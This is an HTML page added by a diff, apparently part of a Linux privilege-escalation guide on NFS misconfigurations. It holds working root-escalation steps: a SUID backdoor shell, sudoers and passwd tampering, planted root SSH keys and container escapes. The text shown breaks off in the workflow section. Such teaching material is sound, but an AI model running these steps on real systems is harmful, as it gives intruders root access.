@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 10 of 10. Enumerate exports and test root squash, writable shares and ownership mapping.">
+  <title>Part 10: NFS Misconfigurations | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html" aria-current="page"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 10</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 10</p>
+        <h1>NFS Misconfigurations</h1>
+        <p class="g-deck">Enumerate exports and test root squash, writable shares and ownership mapping.</p>
+        <div class="g-chapter-meta">
+          <span>17 min read</span>
+          <span>8 sections</span>
+          <span>39 code blocks</span>
+          <span>Part 10 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>8 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#nfs-misconfigurations-for-privilege-escalation" data-toc-link>NFS Misconfigurations for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-nfs" data-toc-link>1. Understanding NFS</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-nfs-shares" data-toc-link>2. Enumeration: Finding NFS Shares</a><a class="g-toc-link depth-3" href="#3-exploitation-vectors" data-toc-link>3. Exploitation Vectors</a><a class="g-toc-link depth-3" href="#4-nfs-in-containerized-environments" data-toc-link>4. NFS in Containerized Environments</a><a class="g-toc-link depth-3" href="#5-practical-exploitation-workflow" data-toc-link>5. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#6-defensive-measures" data-toc-link>6. Defensive Measures</a><a class="g-toc-link depth-3" href="#7-nfs-export-options-cheatsheet" data-toc-link>7. NFS Export Options Cheatsheet</a></nav>
+</details>
+      <div class="g-prose"><h2 id="nfs-misconfigurations-for-privilege-escalation">NFS Misconfigurations for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#nfs-misconfigurations-for-privilege-escalation">#</a></h2>
+<p>Network File System (NFS) misconfigurations are a powerful privilege escalation vector. When NFS shares are insecurely exported, attackers can mount them, access sensitive files, and manipulate system files to gain root access.</p>
+<hr/>
+<h3 id="1-understanding-nfs">1. Understanding NFS<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-nfs">#</a></h3>
+<p><strong>What is NFS?</strong></p>
+<ul>
+<li>Network File System protocol for sharing files over a network</li>
+<li>Allows remote clients to mount directories as if they were local</li>
+<li>Uses <strong>UID/GID mapping</strong> for permissions</li>
+<li>Root squashing is a key security feature</li>
+</ul>
+<p><strong>Key Concepts</strong>:</p>
+<ul>
+<li><strong>Exports</strong>: Directories shared via <code>/etc/exports</code></li>
+<li><strong>Root Squashing</strong>: Maps root (UID 0) to <code>nobody</code> (UID 65534) by default</li>
+<li><strong>No Root Squash</strong>: Allows root UID to retain privileges (dangerous!)</li>
+<li><strong>File Permissions</strong>: Standard Unix permissions apply (rwx)</li>
+<li><strong>GID/UID Mapping</strong>: Remote UIDs map to local UIDs</li>
+</ul>
+<hr/>
+<h3 id="2-enumeration-finding-nfs-shares">2. Enumeration: Finding NFS Shares<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-nfs-shares">#</a></h3>
+<p><strong>Check Mounted NFS Shares</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+df<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+
+<span class="c1"># Show NFS mount information</span>
+showmount<span class="w"> </span>-e<span class="w"> </span>localhost
+<span class="c1"># OR</span>
+showmount<span class="w"> </span>-e<span class="w"> </span><span class="m">127</span>.0.0.1
+
+<span class="c1"># Show all NFS exports</span>
+exportfs<span class="w"> </span>-v
+cat<span class="w"> </span>/etc/exports
+</code></pre></div>
+<p><strong>Check for NFS Services</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if NFS server is running</span>
+ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+systemctl<span class="w"> </span>status<span class="w"> </span>nfs-server
+netstat<span class="w"> </span>-tulpn<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">2049</span>
+rpcinfo<span class="w"> </span>-p<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+</code></pre></div>
+<p><strong>Find NFS Files (from local mounts)</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find files on NFS mounts</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/mnt/nfs/*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/net/*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Automated Tools</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS NFS checks</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="s2">"NFS"</span>
+
+<span class="c1"># Check for writable NFS shares</span>
+<span class="k">for</span><span class="w"> </span>mount<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $3}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$mount</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[!] Writable NFS mount: </span><span class="nv">$mount</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="3-exploitation-vectors">3. Exploitation Vectors<a aria-label="Link to this section" class="g-anchor" href="#3-exploitation-vectors">#</a></h3>
+<h4 id="a-no-root-squash-most-critical">A. No Root Squash (Most Critical)<a aria-label="Link to this section" class="g-anchor" href="#a-no-root-squash-most-critical">#</a></h4>
+<p>If a share has <code>no_root_squash</code> in the exports, remote root users maintain root privileges.</p>
+<p><strong>Check for No Root Squash</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Examine /etc/exports</span>
+cat<span class="w"> </span>/etc/exports
+<span class="c1"># Look for: /share *(rw,no_root_squash)</span>
+<span class="c1"># OR: /share 192.168.1.0/24(rw,no_root_squash)</span>
+
+<span class="c1"># Show current exports</span>
+exportfs<span class="w"> </span>-v
+<span class="c1"># Output: /share 192.168.1.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash)</span>
+</code></pre></div>
+<p><strong>Exploitation - Local</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Mount the share (if already mounted, skip)</span>
+mkdir<span class="w"> </span>/tmp/nfs
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="m">127</span>.0.0.1:/share<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Create a SUID binary on the share as local root</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/nfs/backdoor.c<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;stdlib.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+<span class="s">int main() {</span>
+<span class="s">    setuid(0);</span>
+<span class="s">    setgid(0);</span>
+<span class="s">    system("/bin/bash -p");</span>
+<span class="s">    return 0;</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 3. Compile as root (using fakeroot or local root)</span>
+gcc<span class="w"> </span>/tmp/nfs/backdoor.c<span class="w"> </span>-o<span class="w"> </span>/tmp/nfs/backdoor
+chmod<span class="w"> </span>+s<span class="w"> </span>/tmp/nfs/backdoor
+chown<span class="w"> </span>root:root<span class="w"> </span>/tmp/nfs/backdoor
+
+<span class="c1"># 4. Execute as normal user</span>
+/tmp/nfs/backdoor
+<span class="c1"># Root shell!</span>
+</code></pre></div>
+<p><strong>Exploitation - Remote</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># As local attacker with no root:</span>
+<span class="c1"># 1. Create fake root environment</span>
+mkdir<span class="w"> </span>/tmp/rootfs
+
+<span class="c1"># 2. Create and compile as "root" using fakeroot</span>
+fakeroot<span class="w"> </span>bash
+<span class="c1"># Now inside fakeroot</span>
+gcc<span class="w"> </span>backdoor.c<span class="w"> </span>-o<span class="w"> </span>/tmp/rootfs/backdoor
+chmod<span class="w"> </span>+s<span class="w"> </span>/tmp/rootfs/backdoor
+
+<span class="c1"># 3. Mount the NFS share</span>
+mkdir<span class="w"> </span>/tmp/mount
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target_ip:/share<span class="w"> </span>/tmp/mount
+
+<span class="c1"># 4. Copy the SUID binary (as root from fakeroot)</span>
+cp<span class="w"> </span>/tmp/rootfs/backdoor<span class="w"> </span>/tmp/mount/backdoor
+
+<span class="c1"># 5. On target system, execute:</span>
+/tmp/mount/backdoor
+</code></pre></div>
+<hr/>
+<h4 id="b-writable-nfs-shares">B. Writable NFS Shares<a aria-label="Link to this section" class="g-anchor" href="#b-writable-nfs-shares">#</a></h4>
+<p>Even with root squash, writable shares can lead to privilege escalation.</p>
+<p><strong>Exploitation - Sudoers File</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If /etc/sudoers is on a writable NFS share (rare but possible)</span>
+<span class="c1"># Or if share contains a writable config file</span>
+
+<span class="c1"># 1. Mount the share</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Check if any system file is on the share</span>
+find<span class="w"> </span>/tmp/nfs<span class="w"> </span>-name<span class="w"> </span><span class="s2">"sudoers"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">"passwd"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">"shadow"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 3. Modify if found</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD: ALL'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/nfs/sudoers
+</code></pre></div>
+<p><strong>Exploitation - Cron Jobs</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If share contains cron scripts</span>
+<span class="c1"># 1. Mount share</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Check for cron scripts</span>
+find<span class="w"> </span>/tmp/nfs<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"cron|daily|hourly"</span>
+
+<span class="c1"># 3. Modify writable cron script</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/nfs/backup.sh
+
+<span class="c1"># 4. Wait for cron to execute</span>
+</code></pre></div>
+<p><strong>Exploitation - SSH Keys</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If share contains SSH home directories</span>
+<span class="c1"># 1. Mount share</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/home<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Add your public key to root's authorized_keys</span>
+cat<span class="w"> </span>~/.ssh/id_rsa.pub<span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/nfs/root/.ssh/authorized_keys
+
+<span class="c1"># 3. SSH as root</span>
+ssh<span class="w"> </span>root@target
+</code></pre></div>
+<p><strong>Exploitation - Password File</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If /etc/passwd or /etc/shadow is on NFS (very dangerous)</span>
+<span class="c1"># 1. Mount share</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/etc<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Generate password hash</span>
+openssl<span class="w"> </span>passwd<span class="w"> </span>-1<span class="w"> </span>-salt<span class="w"> </span>abc<span class="w"> </span>password123
+<span class="c1"># Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X.</span>
+
+<span class="c1"># 3. Add new root user to /tmp/nfs/passwd</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/nfs/passwd
+
+<span class="c1"># 4. su hacker (password: password123)</span>
+<span class="c1"># OR su - hacker</span>
+</code></pre></div>
+<hr/>
+<h4 id="c-id-mapping-exploits">C. ID Mapping Exploits<a aria-label="Link to this section" class="g-anchor" href="#c-id-mapping-exploits">#</a></h4>
+<p>NFS maps remote UIDs to local UIDs. If a local user has the same UID as a remote user, they can access files.</p>
+<p><strong>Check UID/GID Mapping</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Show NFS mounts with UID/GID options</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+
+<span class="c1"># Check current user's UID</span>
+id
+<span class="c1"># uid=1000(user) gid=1000(user)</span>
+
+<span class="c1"># Check what UIDs are mapped</span>
+cat<span class="w"> </span>/etc/idmapd.conf
+</code></pre></div>
+<p><strong>Exploitation - UID 0 (Root) Masquerade</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create local user with UID 0</span>
+useradd<span class="w"> </span>-o<span class="w"> </span>-u<span class="w"> </span><span class="m">0</span><span class="w"> </span>-g<span class="w"> </span><span class="m">0</span><span class="w"> </span>nfsroot
+<span class="c1"># OR manually in /etc/passwd</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'nfsroot:x:0:0:root:/root:/bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+
+<span class="c1"># 2. Mount NFS share</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 3. Access files as root</span>
+su<span class="w"> </span>-<span class="w"> </span>nfsroot
+cp<span class="w"> </span>/tmp/nfs/root_owned_file<span class="w"> </span>/tmp/
+</code></pre></div>
+<p><strong>Exploitation - GID 0 (Root Group)</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create local user with GID 0</span>
+usermod<span class="w"> </span>-g<span class="w"> </span><span class="m">0</span><span class="w"> </span>user
+<span class="c1"># OR</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user:x:1000:0:User:/home/user:/bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+
+<span class="c1"># 2. Access group-writable NFS files</span>
+</code></pre></div>
+<hr/>
+<h4 id="d-insecure-export-options">D. Insecure Export Options<a aria-label="Link to this section" class="g-anchor" href="#d-insecure-export-options">#</a></h4>
+<p><strong>Check Export Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">exportfs<span class="w"> </span>-v
+<span class="c1"># Look for:</span>
+<span class="c1"># - rw (read/write) - writable share</span>
+<span class="c1"># - insecure - allows connections from high ports</span>
+<span class="c1"># - nohide - allows traversing submounts</span>
+<span class="c1"># - no_subtree_check - doesn't verify submounts</span>
+<span class="c1"># - fsid=0 - exported as root filesystem</span>
+</code></pre></div>
+<p><strong>Exploitation - Submount Traversal</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If share has nohide, you can access submounts</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+ls<span class="w"> </span>/tmp/nfs/submount<span class="w">  </span><span class="c1"># Even if not explicitly exported</span>
+</code></pre></div>
+<p><strong>Exploitation - Cross-Mounting</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If share has crossmnt, you can access other filesystems</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+ls<span class="w"> </span>/tmp/nfs/../../etc/<span class="w">  </span><span class="c1"># May leak to parent filesystem</span>
+</code></pre></div>
+<hr/>
+<h4 id="e-suid-guid-binary-upload">E. SUID/GUID Binary Upload<a aria-label="Link to this section" class="g-anchor" href="#e-suid-guid-binary-upload">#</a></h4>
+<p>If NFS share is writable but has <code>no_root_squash</code>, you can create SUID binaries.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Mount NFS share</span>
+mkdir<span class="w"> </span>/tmp/nfs
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/tmp/nfs
+
+<span class="c1"># 2. Create SUID binary</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/nfs/exploit.c<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;stdlib.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+<span class="s">int main() {</span>
+<span class="s">    setuid(0);</span>
+<span class="s">    setgid(0);</span>
+<span class="s">    execve("/bin/bash", NULL, NULL);</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 3. Compile with root privileges (if you have root or fakeroot)</span>
+gcc<span class="w"> </span>/tmp/nfs/exploit.c<span class="w"> </span>-o<span class="w"> </span>/tmp/nfs/exploit
+chmod<span class="w"> </span>+s<span class="w"> </span>/tmp/nfs/exploit
+chown<span class="w"> </span>root:root<span class="w"> </span>/tmp/nfs/exploit
+
+<span class="c1"># 4. Execute on target</span>
+/tmp/nfs/exploit
+</code></pre></div>
+<hr/>
+<h4 id="f-using-nfs-to-escape-chroot-jail">F. Using NFS to Escape Chroot/Jail<a aria-label="Link to this section" class="g-anchor" href="#f-using-nfs-to-escape-chroot-jail">#</a></h4>
+<p>If a chroot has NFS mounted inside, you can escape.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Mount NFS share inside chroot</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>target:/share<span class="w"> </span>/chroot/tmp/nfs
+
+<span class="c1"># 2. Create device file (if NFS supports)</span>
+mknod<span class="w"> </span>/chroot/tmp/nfs/test<span class="w"> </span>b<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">0</span>
+
+<span class="c1"># 3. Access /dev/ram0 via NFS</span>
+cat<span class="w"> </span>/chroot/tmp/nfs/test
+</code></pre></div>
+<hr/>
+<h3 id="4-nfs-in-containerized-environments">4. NFS in Containerized Environments<a aria-label="Link to this section" class="g-anchor" href="#4-nfs-in-containerized-environments">#</a></h3>
+<p>NFS misconfigurations in containers can lead to container escapes.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. If container mounts NFS share with no_root_squash</span>
+<span class="c1"># 2. Inside container as root (if you have root in container)</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>host:/share<span class="w"> </span>/mnt
+
+<span class="c1"># 3. Create SUID binary on NFS share</span>
+gcc<span class="w"> </span>/mnt/exploit.c<span class="w"> </span>-o<span class="w"> </span>/mnt/exploit
+chmod<span class="w"> </span>+s<span class="w"> </span>/mnt/exploit
+
+<span class="c1"># 4. Access SUID binary from host</span>
+/mnt/exploit<span class="w">  </span><span class="c1"># Runs as root on host</span>
+</code></pre></div>
+<hr/>
+<h3 id="5-practical-exploitation-workflow">5. Practical Exploitation Workflow<a aria-label="Link to this section" class="g-anchor" href="#5-practical-exploitation-workflow">#</a></h3>
+<p><strong>Step 1: Enumerate NFS</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if NFS server is running</span>
+rpcinfo<span class="w"> </span>-p<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+showmount<span class="w"> </span>-e<span class="w"> </span>localhost
+
+<span class="c1"># Check exports</span>
+exportfs<span class="w"> </span>-v
+cat<span class="w"> </span>/etc/exports
+
+<span class="c1"># Check mounted shares</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+df<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs
+</code></pre></div>
+<p><strong>Step 2: Test Write Access</strong>:</p>
